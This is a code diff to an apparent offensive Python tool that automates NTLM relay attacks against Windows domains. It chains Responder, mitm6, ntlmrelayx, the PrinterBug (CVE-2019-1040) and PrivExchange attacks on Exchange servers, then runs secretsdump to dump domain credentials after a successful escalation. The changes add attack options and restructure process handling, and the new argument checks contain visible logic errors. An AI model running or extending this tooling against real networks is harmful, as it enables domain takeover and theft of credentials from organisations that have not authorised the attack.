@@ -3,7 +3,6 @@
 import asyncio
 import argparse
 import sys
-import signal
 from src.utils import *
 from src.tools import *
 from src.smb import get_unsigned_hosts
@@ -20,8 +19,11 @@ def parse_args():
     parser.add_argument("-tf", "--target-file", help="Target file for ntlmrelayx to relay to")
     parser.add_argument("-u", "--user", help="Creds for PrivExchange: DOMAIN/user:password")
     parser.add_argument("-ef", "--exchange-file", help="Exchange server IP addresses file")
+    parser.add_argument("-e", "--exchange-server", help="Exchange server IP addresses")
     parser.add_argument("-dc", "--domain-controller", help="Domain controller for Drop the Mic and PrivExchange attacks")
-    parser.add_argument("--privexchange", action="store_true", help="Skip the Drop the Mic attack and just perform PrivExchange")
+    parser.add_argument("--privexchange", action="store_true", help="Perform PrivExchange attack")
+    parser.add_argument("--printerbug", action="store_true", help="Perform printerbug attack")
+    parser.add_argument("--httpattack", action="store_true", help="Perform PrivExchange without authentication")
     return parser.parse_args()
 
 def parse_hostlist(hostlist):
@@ -52,64 +54,17 @@ def parse_exchange_scan(proc):
     hosts = []
     for l in proc.stdout:
         if "is VULNERABLE" in l:
-            host = l.split()[1]
+            host = l.split()[2]
             hosts.append(host)
     return hosts
-
-def cleanup(responder, mitm6, ntlmrelayx, printerbug, privexchange):
-    """
-    Catch CTRL-C and kill procs
-    """
-    print_info('CTRL-C caught, cleaning up and closing')
-
-     # Kill procs
-    if responder:
-        print_info('Killing Responder')
-        responder.kill()
-    if privexchange:
-        print_info('Killing privexchange')
-        privexchange.kill()
-    if ntlmrelayx:
-        print_info('Killing ntlmrelayx')
-        ntlmrelayx.kill()
-    if printerbug:
-        print_info('Killing printerbug')
-        printerbug.kill()
-    if mitm6:
-        print_info('Killing mitm6, may take a minute')
-        mitm6.kill()
-
-    time.sleep(3)
-
-    try:
-        os.remove(f'{cwd}/arp.cache')
-    except FileNotFoundError:
-        pass
-
-    print_good('Done')
-    sys.exit()
-
-def fix_exch_args(missing_arg):
-    print_bad(f"Must specify a list of exchange servers with the {missing_arg} argument")
-    print_bad("Example: python autorelayx.py -u LAB/dan:Passw0rd -ef <exchange_servers.txt> -dc <192.168.0.100>")
-    sys.exit()
-
-def fix_relay_args():
-    print_bad(f"Must specify a list of hosts to test for SMB signing with -l <hostlist.txt> or a target file which won't"
-              f" be tested for SMB signing with -tf <target_file.txt>")
-    print_bad("Example: python autorelayx.py -l hostlist.txt")
-    sys.exit()
 
 def exchange_attacks(args, local_ip):
     printerbug = None
     privexchange = None
+    scan = None
 
-    if not args.exchange_file:
-        fix_args('-ef')
-    elif not args.domain_controller:
-        fix_args('-dc')
-
-    if not args.privexchange:
+    # PrinterBug
+    if args.printerbug:
         print_info("Testing Exchange servers for CVE-2019-1040 (PrinterBug)")
         scan = start_exchange_scan(args)
         vuln_hosts = parse_exchange_scan(scan)
@@ -118,21 +73,19 @@ def exchange_attacks(args, local_ip):
             exchange_server = vuln_hosts[0]
             printerbug = start_printerbug(args.user, exchange_server, local_ip)
 
-            return printerbug, privexchange
+            return printerbug, privexchange, scan
 
         else:
-            print_bad("No Exchange servers found vulnerable to SpoolService bug, attempting PrivExchange attack")
+            print_bad("No Exchange servers found vulnerable to SpoolService bug")
 
-    # Run PrivExchange
-    privexchange = start_privexchange(args, local_ip)
+    # PrivExchange
+    elif args.privexchange:
+        privexchange = start_privexchange(args, local_ip)
 
-    return printerbug, privexchange
+    return printerbug, privexchange, scan
 
 async def relay_attacks(args, iface):
     mitm6 = None
-
-    if not args.hostlist and not args.target_file:
-        fix_relay_args()
 
     if args.hostlist:
         hostlist = args.hostlist
@@ -143,7 +96,7 @@ async def relay_attacks(args, iface):
         if len(unsigned_hosts) == 0:
             print_bad('No hosts with SMB signing disabled found, NTLM relaying will fail')
 
-        if len(unsigned_hosts) > 0:
+        else:
             print_good('Unsigned SMB hosts:')
             for h in unsigned_hosts:
                 print_good('  ' + h)
@@ -157,24 +110,75 @@ async def relay_attacks(args, iface):
 
     return responder, mitm6
 
-async def main():
-    responder = None
-    mitm6 = None
-    printerbug = None
-    privexchange = None
+def cleanup(procs):
+    """
+    Catch CTRL-C and kill procs
+    """
+    cwd = os.getcwd()
+    slow_msg = ''
 
+    for p in procs:
+        # exchange_scanner is supposed to be dead after running
+        if p and p.name != "exchange_scanner":
+            if p.name == 'mitm6':
+                slow_msg = ', this may take a minute'
+            print_info(f'Killing {p.name}{slow_msg}')
+
+            try:
+                p.kill()
+            except ProcessLookupError:
+                print_info(f'{p.name} already dead may have errored on start, check autorelayx/logos/{p.name} files')
+
+    try:
+        os.remove(f'{cwd}/arp.cache')
+    except FileNotFoundError:
+        pass
+
+    time.sleep(3)
+
+def check_args(args):
+    if args.privexchange or args.printerbug:
+        if not args.exchange_server or not args.user or not args.domain_controller:
+            print_bad("Incorrect arguments for PrivExchange or PrinterBug attack, necessary args: -e <exchange server> -u <DOM/user:password> -dc <domain controller IP/hostname>")
+            sys.exit()
+
+    elif args.httpattack:
+        if not args.exchange_server:
+            print_bad("Missing -e <exchange server> argument")
+        sys.exit()
+
+    elif not args.hostlist or not args.target_file:
+        print_bad("Missing arguments check README.md for examples; minimum arguments are either -l <hostlist.txt> or -tf <targets_file.txt> for simple SMB relay attack")
+        sys.exit()
+
+async def main():
+    check_args(args)
+    procs = []
     iface, local_ip = get_iface_and_ip(args)
 
-    if args.user:
-        printerbug, privexchange = exchange_attacks(args, local_ip)
+    if any([args.privexchange, args.printerbug]):
+        printerbug, privexchange, scan = exchange_attacks(args, local_ip)
+        procs.append(printerbug)
+        procs.append(privexchange)
+        procs.append(scan)
 
-    else:
+    elif any([args.hostlist, args.target_file, args.httpattack, args.mitm6]):
         responder, mitm6 = await relay_attacks(args, iface)
+        procs.append(responder)
+        procs.append(mitm6)
 
     # Start ntlmrelayx
     ntlmrelayx = start_ntlmrelayx(args)
+    procs.insert(0, ntlmrelayx)
 
-    cleanup(responder, mitm6, ntlmrelayx, printerbug, privexchange)
+    # PrivExchange/PrinterBug successful, run secretsdump
+    if ntlmrelayx.escalation_successful == True:
+        secretsdump = start_secretsdump(args)
+        procs.append(secretsdump)
+
+    print_info('Cleaning up and closing')
+    cleanup(procs)
+    print_good('Done')
 
 if __name__ == "__main__":
 
